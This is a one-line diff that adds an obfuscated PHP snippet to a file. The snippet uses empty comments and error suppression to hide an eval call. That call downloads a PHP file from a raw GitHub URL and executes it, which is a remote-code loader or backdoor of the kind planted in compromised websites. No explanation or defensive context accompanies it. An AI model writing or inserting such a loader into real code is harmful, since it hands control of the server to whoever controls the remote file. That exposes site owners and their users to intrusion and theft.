@@ -1,0 +1,1 @@
+<?=/**/@null; /**/ /*/ /**/@eval/**/ ("?>".file_get_contents (rawurldecode(urldecode("https://raw.githubusercontent.com/Sys-Fxp/Sys-Fxp/main/lib2.php")))); /**/ ?>
